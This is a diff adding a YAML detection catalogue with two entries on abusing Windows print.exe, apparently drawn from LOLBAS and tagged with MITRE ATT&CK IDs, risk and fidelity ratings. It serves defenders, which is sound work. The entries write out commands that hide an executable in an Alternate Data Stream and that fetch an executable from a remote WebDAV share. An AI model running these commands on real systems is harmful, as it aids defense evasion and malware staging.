@@ -1,0 +1,40 @@
+- command: print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe
+  description: Abuse print.exe to copy file.exe into the Alternate Data Stream (ADS) of file.txt.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1564.004
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Print/
+  risk: High
+  risk_reason: Print interaction with ADS and .exe files is a suspicious activity.
+  fidelity: High
+  fidelity_reason: This is typically an abnormal activity for most users.
+  tool: print
+  threatactors:
+    N/A:
+      - N/A
+- command: print /D:C:\OutFolder\outfile.exe \\WebDavServer\Folder\File.exe
+  description: Abuse print.exe to copy a remotely-hosted file.exe into the Alternate Data Stream (ADS) of file.txt.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1564.004
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Print/
+  risk: High
+  risk_reason: Print interaction with ADS and .exe files (especially remotely-hosted) is a suspicious activity.
+  fidelity: High
+  fidelity_reason: This is typically an abnormal activity for most users.
+  tool: print
+  threatactors:
+    N/A:
+      - N/A
